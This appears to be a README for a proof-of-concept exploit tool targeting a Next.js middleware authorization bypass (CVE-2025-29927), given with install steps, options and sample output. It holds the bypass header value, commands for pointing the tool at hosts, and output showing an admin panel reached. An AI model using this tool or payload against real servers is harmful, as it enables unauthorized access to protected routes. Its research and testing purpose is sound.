PoC for Next.js Middleware Bypass (CVE-2025-29927)

⚠️ DisclaimerThis is a proof-of-concept for a fictional vulnerability. Intended for educational and research purposes only. Use responsibly in authorized environments.

🚀 Features

Feature

Description

✨ Color & Verbose

Color-coded output; -v for detailed debug logs.

📦 OOP Structure

Clean, class-based design for maintainability.

🌐 Proxy Support

Route through HTTP(S) proxies (Burp/ZAP) via --proxy.

🍪 Session Handling

Persistent requests.Session for cookies & connection reuse.

🚦 Redirect Control

No-follow-redirect by default; clearly distinguish pass/fail.

🛠 Custom Headers

Override User-Agent, x-middleware-subrequest, or add arbitrary headers.

🛠 Installation

Clone this repository:

git clone https://github.com/your-username/nextjs-middleware-poc.git
cd nextjs-middleware-poc

(Optional) Create & activate a virtual environment:

python3 -m venv .venv
source .venv/bin/activate

Install dependencies:

pip install -r requirements.txt

Requires Python 3.7+

📋 Usage

python poc.py [options] <host>[:port]

Option

Description

-h, --help

Show help message.

-p PATH, --path PATH

Protected route to request (default: /admin).

-s {http,https}, --scheme

Protocol to use (default: http).

--header HEADER

Value for x-middleware-subrequest header (default: middleware:middleware).

-ua USER_AGENT, --user-agent

Custom User-Agent (default: Mozilla/5.0).

--proxy PROXY

HTTP(S) proxy URL (e.g., http://127.0.0.1:8080).

-v, --verbose

Enable debug output for each step.

🔍 Examples

1. Basic test

python poc.py localhost:3000

2. HTTPS & custom path

python poc.py example.com -s https -p /dashboard

3. With proxy & verbose

python poc.py internal-app:8080 --proxy http://127.0.0.1:8080 -v

✅ Expected Output

Success:

[*] Target URL: http://localhost:3000/admin
[+] SUCCESS: Middleware bypassed — access granted!
--- Response Snippet ---
<!DOCTYPE html><html>…<title>Admin Panel</title>…
------------------------

Failure:

[*] Target URL: http://localhost:3000/admin
[-] FAIL: Access denied by middleware (302 Redirect)
